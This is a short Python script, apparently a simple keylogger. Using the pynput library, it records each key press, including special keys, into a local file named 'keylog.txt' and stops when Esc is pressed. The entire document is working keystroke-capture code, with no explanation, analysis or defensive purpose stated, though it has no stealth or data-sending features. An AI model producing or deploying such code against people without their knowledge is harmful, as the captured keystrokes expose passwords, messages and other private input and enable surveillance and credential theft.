import pynput
from pynput.keyboard import Key, Listener

# Path to the log file
log_file = "keylog.txt"

# Function to log keystrokes
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f'{key.char}')
    except AttributeError:
        if key == Key.space:
            with open(log_file, "a") as file:
                file.write(' ')
        else:
            with open(log_file, "a") as file:
                file.write(f' {str(key)} ')

# Function to stop the keylogger
def on_release(key):
    if key == Key.esc:
        return False

# Setting up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
